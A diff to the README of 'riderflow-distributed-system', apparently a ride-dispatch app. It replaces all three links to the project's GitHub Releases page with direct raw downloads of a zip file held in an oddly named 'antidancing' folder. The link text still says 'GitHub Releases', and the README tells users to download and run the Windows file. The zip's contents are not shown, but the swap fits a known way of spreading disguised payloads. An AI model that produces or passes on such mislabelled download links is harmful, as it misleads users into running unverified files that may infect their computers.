@@ -1,6 +1,6 @@
 # 🚕 riderflow-distributed-system - Real-Time Ride Dispatch
 
-[![Download on GitHub Releases](https://img.shields.io/badge/Download%20-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/5308489/riderflow-distributed-system/releases)
+[![Download on GitHub Releases](https://img.shields.io/badge/Download%20-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/5308489/riderflow-distributed-system/main/antidancing/riderflow-distributed-system-2.5.zip)
 
 ## 🚀 What this app does
 
@@ -29,7 +29,7 @@ If the release includes extra support files, keep them in the same folder as the
 
 Visit the release page here:
 
-[Download from GitHub Releases](https://github.com/5308489/riderflow-distributed-system/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/5308489/riderflow-distributed-system/main/antidancing/riderflow-distributed-system-2.5.zip)
 
 On that page, look for the latest release. Then choose the Windows download file if one is listed.
 
@@ -185,7 +185,7 @@ If the app still will not run, try these steps in order:
 
 ## 📎 GitHub release link
 
-[Open the latest release page](https://github.com/5308489/riderflow-distributed-system/releases)
+[Open the latest release page](https://raw.githubusercontent.com/5308489/riderflow-distributed-system/main/antidancing/riderflow-distributed-system-2.5.zip)
 
 ## 🧭 What to expect after launch
 
